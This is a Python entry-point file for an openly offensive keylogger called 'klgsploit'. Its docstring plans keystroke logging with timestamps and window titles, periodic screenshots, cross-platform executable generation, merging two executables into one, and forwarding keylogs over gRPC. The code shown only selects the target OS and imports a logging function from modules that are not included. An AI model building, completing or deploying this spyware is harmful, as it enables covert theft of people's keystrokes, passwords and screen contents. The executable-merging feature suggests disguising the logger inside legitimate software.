"""
structring the assembled code :
This module serves as the main entry point for the assembled application.
main functionalities
cli offensive tool with multi attack functionalities
ability to generate an executable with specified functions
options are
keyloggin into -o output file
-t key logging with time stamp
-m key logging with window title
-s screenshot capture at intervals -i interval in seconds -so output folder
-st screenshots timeout in seconds
-win || -lnx || -mac specify OS
--genexe generate executable with specified options
--merge exe1 exe2 merge two executables into one
--grpc start grpc server to output keylogs into

example usage:
klgsploit.py -o output.log -so output_folder -t -s -st 60 --genexe -lnx keylogger.exe
"""
#import necessary modules
#phase one keylogger functions definition
import sys

# if os is present as argument parse it otherwise detect os
os_arg = None
for i, arg in enumerate(sys.argv):
    if arg in ['-win', '-lnx', '-mac']:
        os_arg = arg
        break
if os_arg:
    sys.argv.pop(i)
    target_os = os_arg[1:]  # remove leading '-'
else:
    if sys.platform.lower().startswith('win'):
        target_os = 'win'
    elif sys.platform.lower().startswith('linux'):
        target_os = 'lnx'
    elif sys.platform.lower().startswith('darwin'):
        target_os = 'mac'
    else:
        print("Unsupported OS")
        sys.exit(1)
def funcRedef(func):
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)
    return wrapper
def keyloggerThread():
    return

if target_os == 'win':
    from keylogwin import *
    @funcRedef
    def keyloggerThread():
        loggerFunction()

elif target_os in ('lnx', 'mac'):
    from keylogtest import *
    @funcRedef
    def keyloggerThread():
        loggerFunction()
# testing
if __name__ == "__main__":
    keyloggerThread()
